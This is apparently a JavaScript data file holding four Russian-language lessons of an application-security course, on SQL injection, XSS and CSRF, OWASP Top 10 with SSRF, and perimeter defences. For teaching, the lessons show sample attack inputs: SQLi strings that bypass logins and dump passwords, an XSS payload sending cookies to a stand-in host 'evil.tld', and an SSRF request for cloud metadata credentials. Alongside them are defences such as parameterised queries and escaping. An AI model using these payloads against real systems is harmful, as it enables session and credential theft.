// Семестр 5: Безопасность приложений
const SEMESTER_5 = (function() {
    function L(id, title, type, content) { return { id, title, type, content }; }
    function makeContent(semNum, lessonNum, title, bodyHTML, sources) {
        const src = sources ? `<div class="source-block"><h4><i class="fas fa-book"></i> Источники</h4><ul>${sources.map(s=>`<li>${s}</li>`).join('')}</ul></div>` : '';
        return `<h1>Урок ${semNum}.${lessonNum}: ${title}</h1>${bodyHTML}${src}`;
    }
    const lessons = [];

    // 5.1
    lessons.push(L("5.1", "SQL-инъекции", "web", makeContent(5, 1, "SQL-инъекции", `
<div class="theory-block"><h3>Суть уязвимости</h3>
<p><span class="definition">SQL-инъекция</span> возникает, когда пользовательский ввод попадает в текст SQL-запроса без должной обработки, позволяя злоумышленнику изменить логику запроса. Несмотря на возраст (класс известен с конца 90-х), инъекции стабильно входят в OWASP Top 10 — потому что легаси-код, самописные ORM-обёртки и «быстрые» правки без ревью продолжают их порождать.</p></div>

<div class="lesson-card"><h3>Классический пример</h3>
<pre data-lang="php"><code>// Уязвимый код
$query = "SELECT * FROM users WHERE login = '" . $_POST['login'] . "' AND pass = '" . $_POST['pass'] . "'";
// Ввод в поле login: admin' -- 
// Итоговый запрос:
// SELECT * FROM users WHERE login = 'admin' -- ' AND pass = '...'
// Всё после -- считается комментарием — проверка пароля отброшена</code></pre>
<p>Более разрушительный вариант — <code>' UNION SELECT username, password FROM users --</code>, позволяющий вытащить данные из произвольной таблицы, если структура запроса это допускает.</p>
</div>

<div class="lesson-card"><h3>Виды SQL-инъекций</h3>
<table><tr><th>Тип</th><th>Как работает</th></tr>
<tr><td>In-band (classic)</td><td>результат виден прямо в ответе приложения</td></tr>
<tr><td>Blind (boolean-based)</td><td>ответ приложения меняется (да/нет), данные восстанавливают побитово через десятки запросов</td></tr>
<tr><td>Blind (time-based)</td><td>используется задержка (<code>SLEEP()</code>), различие определяется по времени ответа</td></tr>
<tr><td>Out-of-band</td><td>данные эксфильтруются через другой канал — DNS-запрос, HTTP-callback</td></tr>
</table>
</div>

<div class="theory-block"><h3>Единственно верная защита — параметризация</h3>
<p>Правильное решение — не «фильтрация» пользовательского ввода, а <b>параметризованные запросы (prepared statements)</b>, где данные никогда не смешиваются с текстом SQL-команды на уровне синтаксиса драйвера БД.</p>
<pre data-lang="php"><code>// Безопасный вариант (PDO, PHP)
$stmt = $pdo->prepare("SELECT * FROM users WHERE login = ? AND pass_hash = ?");
$stmt->execute([$login, hash('sha256', $password)]);</code></pre>
<p>Дополнительные слои: принцип наименьших привилегий для учётной записи БД (нет причин, чтобы веб-приложение могло выполнять <code>DROP TABLE</code>), WAF как компенсирующий контроль, но не замена параметризации.</p></div>
`, ["OWASP SQL Injection Prevention Cheat Sheet", "OWASP Testing Guide v4, раздел WSTG-INPV-05", "portswigger.net/web-security/sql-injection"])));

    // 5.2
    lessons.push(L("5.2", "XSS и CSRF", "web", makeContent(5, 2, "XSS и CSRF", `
<div class="theory-block"><h3>XSS — межсайтовый скриптинг</h3>
<p><span class="definition">XSS</span> позволяет злоумышленнику выполнить произвольный JavaScript в браузере жертвы в контексте доверенного сайта — то есть с доступом к его cookie, localStorage, DOM и возможностью выполнять запросы от имени залогиненного пользователя.</p></div>

<div class="lesson-card"><h3>Три классических вида XSS</h3>
<table><tr><th>Вид</th><th>Где хранится payload</th></tr>
<tr><td>Stored (persistent)</td><td>сохраняется на сервере (комментарий, профиль) и выполняется у каждого посетителя страницы</td></tr>
<tr><td>Reflected</td><td>приходит в самом запросе (параметр URL) и тут же отражается в ответе без сохранения</td></tr>
<tr><td>DOM-based</td><td>уязвимость целиком на клиенте — JS сам небезопасно вставляет данные из URL/DOM в разметку</td></tr>
</table>
<pre data-lang="html"><code>&lt;!-- Пример уязвимого поиска: параметр q отражается без экранирования --&gt;
&lt;p&gt;Результаты по запросу: &lt;?php echo $_GET['q']; ?&gt;&lt;/p&gt;
&lt;!-- Атака: ?q=&lt;script&gt;fetch('https://evil.tld/steal?c='+document.cookie)&lt;/script&gt; --&gt;</code></pre>
</div>

<div class="theory-block"><h3>Защита от XSS</h3>
<p>Главное правило — <b>контекстное экранирование вывода</b>: то, что безопасно вставлять в текст HTML, небезопасно вставлять в атрибут или в блок <code>&lt;script&gt;</code>, и наоборот. Современные фреймворки (React, Vue, Angular) по умолчанию экранируют вставляемые данные — большинство XSS в таких приложениях возникает именно там, где разработчик осознанно обходит эту защиту (<code>dangerouslySetInnerHTML</code>, <code>v-html</code>). Дополнительный барьер — заголовок <b>Content-Security-Policy</b>, ограничивающий источники исполняемого JS.</p></div>

<div class="lesson-card"><h3>CSRF — подделка межсайтовых запросов</h3>
<p><span class="definition">CSRF</span> заставляет браузер жертвы, уже авторизованной на сайте, незаметно отправить запрос от её имени (например, открыв вредоносную страницу с автоотправляющейся формой). Работает потому, что браузер автоматически прикладывает cookie сессии к любому запросу на домен, независимо от того, с какой страницы он инициирован.</p>
<p><b>Защита:</b> CSRF-токен, уникальный для сессии/формы и не предсказуемый извне; атрибут cookie <code>SameSite=Lax/Strict</code>, ограничивающий отправку cookie в кросс-доменных запросах; проверка заголовка <code>Origin</code>/<code>Referer</code> для чувствительных действий.</p>
</div>
`, ["OWASP Cross Site Scripting Prevention Cheat Sheet", "OWASP CSRF Prevention Cheat Sheet", "MDN — Content-Security-Policy"])));

    // 5.3
    lessons.push(L("5.3", "OWASP Top 10 и SSRF", "web", makeContent(5, 3, "OWASP Top 10 и SSRF", `
<div class="theory-block"><h3>OWASP Top 10 — язык индустрии</h3>
<p>OWASP Top 10 — регулярно обновляемый список наиболее критичных классов уязвимостей веб-приложений, формируемый на основе данных от десятков организаций. Это не научная таксономия, а практический ориентир: на что в первую очередь смотреть при аудите и куда направлять бюджет защиты.</p></div>

<div class="lesson-card"><h3>Ключевые категории (редакция 2021)</h3>
<table><tr><th>№</th><th>Категория</th><th>Суть</th></tr>
<tr><td>A01</td><td>Broken Access Control</td><td>пользователь получает доступ к чужим данным/действиям (IDOR, отсутствие проверки прав)</td></tr>
<tr><td>A02</td><td>Cryptographic Failures</td><td>слабое/отсутствующее шифрование чувствительных данных</td></tr>
<tr><td>A03</td><td>Injection</td><td>SQL/NoSQL/OS command/LDAP-инъекции</td></tr>
<tr><td>A05</td><td>Security Misconfiguration</td><td>дефолтные пароли, лишние сервисы, подробные ошибки в проде</td></tr>
<tr><td>A08</td><td>Software and Data Integrity Failures</td><td>небезопасные обновления/CI-CD пайплайны, недоверенные зависимости</td></tr>
<tr><td>A10</td><td>SSRF</td><td>сервер заставляют выполнить запрос туда, куда решает атакующий</td></tr>
</table>
</div>

<div class="warning-block"><h3>SSRF — Server-Side Request Forgery</h3>
<p>SSRF возникает, когда приложение по запросу пользователя обращается к произвольному URL (загрузка превью, webhook, импорт по ссылке) без ограничения адресата. Атакующий подставляет внутренний адрес — например, метаданные облачного провайдера (<code>http://169.254.169.254/</code> в AWS/GCP/Azure), получая временные учётные данные IAM-роли сервера, или адреса внутренней сети, недоступные снаружи напрямую.</p>
<pre data-lang="text"><code>POST /fetch-preview
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></pre>
<p><b>Защита:</b> allow-list разрешённых доменов/протоколов, запрет резолва в приватные и link-local диапазоны на сетевом уровне, отдельный сегмент сети без доступа к метаданным облака для сервисов, выполняющих внешние запросы по указке пользователя.</p></div>
`, ["OWASP Top 10:2021", "OWASP SSRF Prevention Cheat Sheet", "portswigger.net/web-security/ssrf"])));

    // 5.4
    lessons.push(L("5.4", "Сетевая защита периметра: IDS/IPS, WAF, VPN", "web", makeContent(5, 4, "Сетевая защита периметра: IDS/IPS, WAF, VPN", `
<div class="theory-block"><h3>Эшелонированная защита</h3>
<p>Ни один защитный механизм не работает как единственная линия обороны — это принцип <span class="definition">defense in depth</span>. Сетевой периметр обычно строится из нескольких взаимно дополняющих слоёв: фильтрация трафика, обнаружение атак, специализированная защита веб-уровня, защищённые каналы для удалённого доступа.</p></div>

<div class="lesson-card"><h3>IDS vs IPS</h3>
<p><b>IDS</b> (Intrusion Detection System) анализирует трафик или события в системе и <i>сигнализирует</i> об атаке (пассивно — копия трафика, не в разрыв канала). <b>IPS</b> (Intrusion Prevention System) работает в разрыв канала и может <i>активно блокировать</i> обнаруженный вредоносный трафик. Обнаружение строится на двух подходах: сигнатурном (известные паттерны атак — быстро, но не ловит новое) и аномальном/поведенческом (отклонение от baseline — ловит неизвестные атаки, но даёт больше ложных срабатываний).</p>
</div>

<div class="lesson-card"><h3>WAF — Web Application Firewall</h3>
<p>WAF работает на уровне HTTP(S) и понимает семантику веб-запросов — в отличие от классического сетевого фаервола, который видит только IP/порты. WAF фильтрует типичные атакующие паттерны (сигнатуры SQLi/XSS, аномальные заголовки, rate limiting) и часто разворачивается как reverse-proxy перед приложением или как управляемый облачный сервис (Cloudflare, AWS WAF). <b>Важно:</b> WAF — компенсирующий контроль, а не замена безопасной разработки: он снижает риск, но не устраняет первопричину уязвимости в коде.</p>
</div>

<div class="lesson-card"><h3>VPN и защищённый удалённый доступ</h3>
<p>VPN создаёт зашифрованный туннель поверх недоверенной сети (интернета), логически расширяя защищённый периметр до удалённого устройства. Основные протоколы: <b>IPsec</b> (работает на сетевом уровне, часто site-to-site), <b>OpenVPN</b> (гибкий, TLS-based), <b>WireGuard</b> (современный, компактный код, высокая производительность, всё более популярный выбор по умолчанию).</p>
<p>Модель «замок и ров» (доверяй всему внутри периметра после VPN-подключения) постепенно вытесняется моделью <b>Zero Trust</b> — где каждый запрос проверяется по идентичности и контексту независимо от того, откуда он пришёл, включая «изнутри» сети.</p>
</div>
`, ["NIST SP 800-94 (Guide to Intrusion Detection and Prevention Systems)", "OWASP Virtual Patching Best Practices", "WireGuard — Whitepaper, J. A. Donenfeld"])));

    return { id: 5, title: "🌐 Безопасность приложений", motto: "Защита периметра", lessons: lessons,
        literature: [
            "OWASP Testing Guide v4",
            "Stuttard D., Pinto M. «The Web Application Hacker's Handbook», 2nd ed.",
            "Anderson R. «Security Engineering», 3rd ed."
        ],
        links: [
            {t: "🕷️ PortSwigger Web Security Academy — бесплатные лаборатории", u: "https://portswigger.net/web-security"},
            {t: "📋 OWASP Cheat Sheet Series", u: "https://cheatsheetseries.owasp.org/"},
            {t: "🎯 OWASP Juice Shop — учебное уязвимое приложение", u: "https://owasp.org/www-project-juice-shop/"}
        ]
    };
})();
if (!window.__KERNEL_SEMESTERS) window.__KERNEL_SEMESTERS = [];
window.__KERNEL_SEMESTERS.push({ id: 5, data: SEMESTER_5 });
